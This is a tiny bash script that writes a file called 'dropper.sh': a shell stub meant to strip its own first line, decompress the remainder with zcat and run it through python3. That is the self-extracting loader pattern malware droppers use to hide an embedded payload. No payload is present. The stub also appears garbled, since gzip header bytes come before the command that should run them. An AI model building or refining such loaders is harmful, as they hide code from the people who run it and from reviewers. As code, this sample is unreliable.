#!/bin/bash
echo -en '#!/bin/sh\n\x1f\x8b\x08\x08\nsed 1d $0|zcat|python3\n\0' > dropper.sh
